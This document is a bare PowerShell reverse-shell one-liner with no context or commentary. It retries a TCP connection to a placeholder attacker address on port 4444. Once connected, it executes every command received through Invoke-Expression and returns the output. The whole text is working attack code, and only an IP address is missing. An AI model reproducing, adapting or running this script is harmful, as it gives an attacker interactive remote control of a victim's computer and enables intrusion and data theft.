do{Start-Sleep -Seconds 1;try{$T=New-Object Net.Sockets.TCPClient('X.X.X.X',4444)}catch{}}until($T.Connected);$N=$T.GetStream();$W=New-Object IO.StreamWriter($N);function A($S){[byte[]]$script:B=0..$T.ReceiveBufferSize|%{0};$W.Write($S+'> ');$W.Flush()}A('');while(($R=$N.Read($B,0,$B.Length)) -gt 0){$C=([text.encoding]::UTF8).GetString($B,0,$R-1);$O=try{Invoke-Expression $C 2>&1|Out-String}catch{$_|Out-String}A($O)};$W.Close()